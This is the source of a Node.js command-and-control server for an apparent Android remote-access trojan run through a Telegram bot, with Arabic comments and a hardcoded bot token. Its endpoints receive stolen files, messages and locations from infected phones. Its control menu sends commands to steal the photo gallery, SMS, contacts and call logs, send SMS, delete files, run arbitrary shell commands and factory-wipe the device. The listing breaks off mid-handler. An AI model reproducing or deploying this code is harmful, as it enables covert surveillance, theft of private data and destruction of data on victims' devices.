const express = require('express');
const webSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api'); // تم التصحيح هنا لاستخدام الحرف الكبير
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// توكن ومعلومات البوت
const token = '8962035512:AAGxtvK_0IboGWh2KqNEUAqH48xdHbi3DIY';
const id = '8766671233';
const address = 'https://google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new TelegramBot(token, { polling: true }); // تم التصحيح هنا أيضاً ليعمل كـ constructor صحيح
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// الصفحة الرئيسية للسيرفر
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل السيرفر المطور المحدث</h1>');
});

// استقبال الملفات والصور المسحوبة من العميل وإرسالها للبوت
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• تم سحب ملف من جهاز: <b>${req.headers.model || 'غير معروف'}</b>`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: req.file.mimetype || 'application/octet-stream',
    });
    res.send('');
});

// استقبال النصوص المخطوفة
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من جهاز <b>${req.headers.model}</b>:\n\n` + req.body['text'], { parse_mode: "HTML" });
    res.send('');
});

// استقبال الإحداثيات الجغرافية
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `°• موقع جغرافي من جهاز: <b>${req.headers.model}</b>`, { parse_mode: "HTML" });
    res.send('');
});

// إدارة اتصالات الـ WebSocket للأجهزة
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || '100%';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || '100';
    const provider = req.headers.provider || 'Unknown';

    ws.uuid = uuid;
    appClients.set(uuid, { model, battery, version, brightness, provider });

    appBot.sendMessage(id,
        `°• 📱 جهاز جديد متصل الآن\n\n` +
        `• موديل الجهاز : <b>${model}</b>\n` +
        `• البطارية : <b>${battery}</b>\n` +
        `• النظام : <b>${version}</b>\n` +
        `• سطوع الشاشة : <b>${brightness}</b>\n` +
        `• المزود : <b>${provider}</b>`,
        { parse_mode: "HTML" }
    );

    ws.on('close', function () {
        appBot.sendMessage(id, `°• ❌ انقطع اتصال الجهاز: <b>${model}</b>`, { parse_mode: "HTML" });
        appClients.delete(ws.uuid);
    });
});

// معالجة الرسائل الواردة من لوحة تحكم التليجرام
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (id != chatId) {
        return appBot.sendMessage(chatId, '°• طلب الإذن مرفوض.');
    }

    if (message.reply_to_message) {
        const replyText = message.reply_to_message.text;

        // أمر إرسال رسالة لرقم محدد
        if (replyText.includes('الرجاء كتابة رقم الذي تريد ارسال الية')) {
            currentNumber = message.text;
            return appBot.sendMessage(id, '°• جيد الآن قم بكتابة نص الرسالة المراد إرسالها:', { reply_markup: { force_reply: true } });
        }
        if (replyText.includes('جيد الآن قم بكتابة نص الرسالة المراد إرسالها')) {
            sendCommandToClient(currentUuid, `send_message:${currentNumber}/${message.text}`);
            currentNumber = ''; currentUuid = '';
            return sendProcessingMessage();
        }

        // أمر مسار سحب الملفات والصور
        if (replyText.includes('ادخل مسار الملف أو المجلد لسحبه')) {
            sendCommandToClient(currentUuid, `pull_file:${message.text}`);
            currentUuid = '';
            return sendProcessingMessage();
        }

        // أمر حذف الملفات
        if (replyText.includes('ادخل مسار الملف الذي تريد حذفه')) {
            sendCommandToClient(currentUuid, `delete_file:${message.text}`);
            currentUuid = '';
            return sendProcessingMessage();
        }

        // أمر تشغيل أوامر تيرمكس / لينكس المباشرة (Shell Command)
        if (replyText.includes('أدخل أمر النظام المباشر لتنفيذه')) {
            sendCommandToClient(currentUuid, `shell_exec:${message.text}`);
            currentUuid = '';
            return sendProcessingMessage();
        }
    }

    // الأوامر الأساسية والأزرار
    if (message.text == '/start') {
        appBot.sendMessage(id,
            '°• 🤖 مرحباً بك في لوحة التحكم المطورة والمحدثة بالكامل.\n\n' +
            '• استخدم الأزرار بالأسفل لإدارة وتتبع الأجهزة المتصلة مباشرة.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        );
    }

    if (message.text == 'الاجهزة المتصلة') {
        if (appClients.size == 0) {
            appBot.sendMessage(id, '°• لا توجد أجهزة متصلة حالياً.');
        } else {
            let text = '°• قائمة الأجهزة النشطة:\n\n';
            appClients.forEach((value) => {
                text += `• الموديل: <b>${value.model}</b> | نظام: <b>${value.version}</b>\n`;
            });
            appBot.sendMessage(id, text, { parse_mode: "HTML" });
        }
    }

    if (message.text == 'تنفيذ الامر') {
        if (appClients.size == 0) {
            appBot.sendMessage(id, '°• لا توجد أجهزة متصلة لتنفيذ الأوامر عليها.');
        } else {
            const deviceListKeyboard = [];
            appClients.forEach((value, key) => {
                deviceListKeyboard.push([{ text: value.model, callback_data: 'device:' + key }]);
            });
            appBot.sendMessage(id, '°• حدد الجهاز المراد إرسال الأوامر المتقدمة إليه:', {
                "reply_markup": { "inline_keyboard": deviceListKeyboard }
            });
        }
    }
});

// معالجة الأزرار المضمنة (Inline Keyboard) والقائمة المتقدمة الجديدة
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (command == 'device') {
        const client = appClients.get(uuid);
        if (!client) return appBot.sendMessage(id, '❌ هذا الجهاز لم يعد متصلاً.');

        appBot.editMessageText(`°• 🛠️ قائمة التحكم المتقدمة بالجهاز: <b>${client.model}</b>`, {
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📸 سحب الصور والمعرض', callback_data: `pull_gallery:${uuid}` },
                        { text: '📥 سحب ملف محدد', callback_data: `request_file:${uuid}` }
                    ],
                    [
                        { text: '🔥 فرمتة كاملة للجهاز', callback_data: `format_device:${uuid}` },
                        { text: '🗑️ حذف ملف/مجلد', callback_data: `request_delete:${uuid}` }
                    ],
                    [
                        { text: '💻 تنفيذ أمر النظام (Shell)', callback_data: `request_shell:${uuid}` },
                        { text: '📍 تحديد الموقع الحالي', callback_data: `get_location:${uuid}` }
                    ],
                    [
                        { text: '📞 سجل المكالمات', callback_data: `get_calls:${uuid}` },
                        { text: '👥 جهات الاتصال', callback_data: `get_contacts:${uuid}` }
                    ],
                    [
                        { text: '💬 سحب الرسائل القصيرة', callback_data: `get_messages:${uuid}` },
                        { text: '✉️ إرسال رسالة SMS', callback_data: `request_sms:${uuid}` }
                    ]
                ]
            },
            parse_mode: "HTML"
        });
    }

    // معالجة الأوامر الفورية والمستندة إلى ردود
    if (command == 'pull_gallery') {
        sendCommandToClient(uuid, 'pull_gallery');
        appBot.deleteMessage(id, msg.message_id);
        sendProcessingMessage();
    }
    if (command == 'format_device') {
        sendCommandToClient(uuid, 'wipe_factory_reset');
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '⚠️ <b>تم إرسال أمر الفرمتة الكاملة وتدمير البيانات للجهاز المستهدف بنجاح.</b>', { parse_mode: "HTML" });
    }
    if (command == 'get_location') {
        sendCommandToClient(uuid, 'location');
        appBot.deleteMessage(id, msg.message_id);
        sendProcessingMessage();
    }
    if (command == 'get_calls') {
        sendCommandToClient(uuid, 'calls');
        appBot.deleteMessage(id, msg.message_id);
        sendProcessingMessage();
    }
    if (command == 'get_contacts') {
        sendCommandToClient(uuid, 'contacts');
        appBot.deleteMessage(id, msg.message_id);
        sendProcessingMessage();
    }
    if (command == 'get_messages') {
        sendCommandToClient(uuid, 'messages');
        appBot.deleteMessage(id, msg.message_id);
        sendProcessingMessage();
    }

    // الأوامر التي تحتاج إلى مدخلات نصية (Force Reply)
    if (command == 'request_file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• ادخل مسار الملف أو المجلد لسحبه (مثال: DCIM/Camera أو Documents/file.pdf):', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    if (command == 'request_delete') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• ادخل مسار الملف الذي تريد حذفه نهائياً من الجهاز:', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    if (command == 'request_shell') {
